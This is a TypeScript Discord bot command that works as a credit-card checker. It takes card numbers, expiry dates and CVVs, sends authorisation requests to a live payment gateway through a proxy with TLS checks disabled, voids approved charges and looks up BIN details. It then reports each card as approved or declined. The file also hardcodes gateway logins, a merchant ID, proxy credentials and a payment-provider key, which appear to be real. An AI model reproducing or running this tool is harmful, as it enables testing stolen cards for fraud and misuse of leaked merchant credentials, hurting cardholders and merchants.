import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";

const PROXY_CONFIG = {
  host: "brd.superproxy.io",
  port: 33335,
  auth: {
    username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
    password: "2rupnulv0s5o",
  },
};

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});

const CREDENTIALS = "zjjidqqx:Yo9Je2Cs9Nk3$d3$P5$6";
const MERCHANT_ID = "496045924883";

function parseJsonValue(source: string, jToken: string): string {
  try {
    const json = typeof source === 'string' ? JSON.parse(source) : source;
    return json[jToken] || "";
  } catch (e) {
    // Fallback: try string extraction
    const pattern = new RegExp(`"${jToken}"\\s*:\\s*"([^"]+)"`, 'i');
    const match = source.match(pattern);
    return match ? match[1] : "";
  }
}

function base64Encode(str: string): string {
  return Buffer.from(str).toString('base64');
}

export const data = new SlashCommandBuilder()
  .setName("fiserv")
  .setDescription("Fiserv Gateway")
  .addStringOption((option) =>
    option
      .setName("card")
      .setDescription("Card details in format: CC|MM|YYYY|CVV (CVV optional)")
      .setRequired(true)
  )
  .addStringOption((option) =>
    option
      .setName("amount")
      .setDescription("Payment amount (e.g., 1.00)")
      .setRequired(true)
  );

export async function execute(interaction: ChatInputCommandInteraction) {
  await interaction.deferReply();

  const cardInput = interaction.options.getString("card", true);
  const amountInput = interaction.options.getString("amount", true);

  const parts = cardInput.split("|").map((p) => p.trim());

  if (parts.length < 3 || parts.length > 4) {
    await interaction.editReply({
      content: "❌ Invalid format. Use: CC|MM|YYYY|CVV or CC|MM|YYYY (e.g., 4111111111111111|12|2025|123 or 4111111111111111|12|2025)",
    });
    return;
  }

  const [cc, mm, yyyy, cvv] = parts;

  // Convert YY to 20YY format
  let yy1: string;
  if (yyyy.length === 4) {
    yy1 = yyyy.substring(2);
  } else if (yyyy.length === 2) {
    yy1 = yyyy;
  } else {
    await interaction.editReply({
      content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
    });
    return;
  }

  if (!cc || !mm || !yyyy) {
    await interaction.editReply({
      content: "❌ Required fields: CC|MM|YYYY (CVV is optional)",
    });
    return;
  }

  const amount = parseFloat(amountInput).toFixed(2);
  if (isNaN(parseFloat(amountInput))) {
    await interaction.editReply({
      content: "❌ Invalid amount format. Use a number (e.g., 1.00)",
    });
    return;
  }

  try {
    const cardDisplay = cvv ? `${cc}|${mm}|${yyyy}|${cvv}` : `${cc}|${mm}|${yyyy}`;
    const embed = new EmbedBuilder()
      .setTitle("Fiserv Gateway")
      .setColor(0x0099ff)
      .setDescription("Processing payment...")
      .addFields({ name: "Card", value: `\`${cardDisplay}\``, inline: true })
      .addFields({ name: "Amount", value: `$${amount}`, inline: true })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    // Convert credentials to Base64
    const login = base64Encode(CREDENTIALS);

    // Prepare auth request
    embed.setDescription("Sending auth request...");
    await interaction.editReply({ embeds: [embed] });

    const authHeaders: any = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
      "Pragma": "no-cache",
      "Accept": "*/*",
      "Accept-Language": "en-US,en;q=0.8",
      "Authorization": `Basic ${login}`,
      "Content-Type": "application/json",
    };

    const authPayload: any = {
      merchid: MERCHANT_ID,
      account: cc,
      expiry: `${mm}/${yy1}`,
      amount: amount,
      currency: "USD"
    };

    // Only include CVV if provided
    if (cvv && cvv.trim() !== "") {
      authPayload.cvv2 = cvv.trim();
    }

    let authResponse: any;
    let respcode = "";
    let resptext = "";
    let assocRespCode = "";
    let assocResp = "";
    let merchAdviceText = "";
    let declineCategoryText = "";
    let retref = "";
    let authcode = "";
    let hasAuthcode = false;

    try {
      authResponse = await axios.put(
        "https://fts.cardconnect.com/cardconnect/rest/auth",
        authPayload,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: authHeaders,
          timeout: 15000,
        }
      );

      const responseData = typeof authResponse.data === 'string' 
        ? authResponse.data 
        : JSON.stringify(authResponse.data);

      // Parse response fields
      respcode = parseJsonValue(responseData, "respcode");
      resptext = parseJsonValue(responseData, "resptext");
      assocRespCode = parseJsonValue(responseData, "assocRespCode");
      assocResp = parseJsonValue(responseData, "assocRespText");
      merchAdviceText = parseJsonValue(responseData, "merchAdviceText");
      declineCategoryText = parseJsonValue(responseData, "declineCategoryText");

      // Check if authcode exists in response
      hasAuthcode = responseData.includes('"authcode":"') || responseData.includes('"authcode" :"');

      if (hasAuthcode) {
        retref = parseJsonValue(responseData, "retref");
        authcode = parseJsonValue(responseData, "authcode");

        // Make void request if authcode exists
        embed.setDescription("Voiding transaction...");
        await interaction.editReply({ embeds: [embed] });

        const voidPayload = {
          merchid: MERCHANT_ID,
          retref: retref
        };

        try {
          const voidResponse = await axios.put(
            "https://fts.cardconnect.com/cardconnect/rest/void",
            voidPayload,
            {
              proxy: PROXY_CONFIG,
              httpsAgent: httpsAgent,
              headers: authHeaders,
              timeout: 15000,
            }
          );

          const voidData = typeof voidResponse.data === 'string' 
            ? voidResponse.data 
            : JSON.stringify(voidResponse.data);
          
          // Parse authcode from void response if needed
          if (!authcode) {
            authcode = parseJsonValue(voidData, "authcode");
          }
        } catch (voidError: any) {
          // Void request error handled silently
        }
      }
    } catch (error: any) {
      // Auth request error handled silently
    }

    // Get BIN info
    let binInfo = "";
    try {
      const checkoutResponse = await axios.post(
        "https://api.checkout.com/tokens",
        {
          type: "card",
          number: cc,
          expiry_month: parseInt(mm),
          expiry_year: parseInt(yyyy),
          cvv: "",
          phone: {},
          preferred_scheme: "",
          requestSource: "JS",
        },
        {
          headers: {
            accept: "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.6",
            authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
            "content-type": "application/json",
            origin: "https://js.checkout.com",
            referer: "https://js.checkout.com/",
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
          },
          timeout: 10000,
        }
      );

      const binData = checkoutResponse.data;
      const issuer = parseJsonValue(JSON.stringify(binData), "issuer");
      const cardTypeBin = parseJsonValue(JSON.stringify(binData), "card_type");
      const cardCategory = parseJsonValue(JSON.stringify(binData), "card_category");
      const productType = parseJsonValue(JSON.stringify(binData), "product_type");
      const issuerCountry = parseJsonValue(JSON.stringify(binData), "issuer_country");

      if (issuer || cardTypeBin) {
        binInfo = `${issuer || ""} - ${cardTypeBin || ""} ${cardCategory || ""} - ${productType || ""} - ${issuerCountry || ""}`.trim();
      }
    } catch (error: any) {
      // BIN lookup error handled silently
    }

    // Determine success based on response
    const success = respcode === "00" || (respcode && parseInt(respcode) >= 0 && parseInt(respcode) < 10);

    // Build Gateway Response
    let gatewayResponse = "";
    if (resptext) {
      gatewayResponse = resptext;
      if (respcode) {
        gatewayResponse += ` (${respcode})`;
      }
    } else if (respcode) {
      gatewayResponse = respcode;
    }

    // Build Processor Response
    let processorResponse = "";
    if (assocResp) {
      processorResponse = assocResp;
      if (assocRespCode) {
        processorResponse += ` (${assocRespCode})`;
      }
    } else if (assocRespCode) {
      processorResponse = assocRespCode;
    }

    // Build Merchant Advise
    let merchantAdvise = "";
    if (merchAdviceText) {
      merchantAdvise = merchAdviceText;
    }
    if (declineCategoryText) {
      merchantAdvise += (merchantAdvise ? " | " : "") + declineCategoryText;
    }

    const resultEmbed = new EmbedBuilder()
      .setTitle(success ? `✅ Approved $${amount} Fiserv Gateway` : `❌ Declined $${amount} Fiserv Gateway`)
      .setColor(success ? 0x00ff00 : 0xff0000)
      .addFields({ name: "Card", value: `\`${cardDisplay}\``, inline: false })
      .setTimestamp();

    if (gatewayResponse) {
      resultEmbed.addFields({
        name: "Gateway Response:",
        value: gatewayResponse,
        inline: false,
      });
    }

    if (processorResponse) {
      resultEmbed.addFields({
        name: "Processor Response:",
        value: processorResponse,
        inline: false,
      });
    }

    if (merchantAdvise) {
      resultEmbed.addFields({
        name: "Merchant Advise:",
        value: merchantAdvise,
        inline: false,
      });
    }

    if (authcode) {
      resultEmbed.addFields({
        name: "Authcode",
        value: authcode,
        inline: true,
      });
    }

    if (binInfo) {
      resultEmbed.addFields({
        name: "BIN Info",
        value: binInfo,
        inline: false,
      });
    }


    if (!respcode && !resptext) {
      resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
    }

    const username = interaction.user.username || interaction.user.tag;
    resultEmbed.setFooter({ text: `Checked by ${username}` });

    await interaction.editReply({ embeds: [resultEmbed] });
  } catch (error: any) {
    await interaction.editReply({
      content: `❌ Error processing payment: ${error.message}`,
    });
  }
}

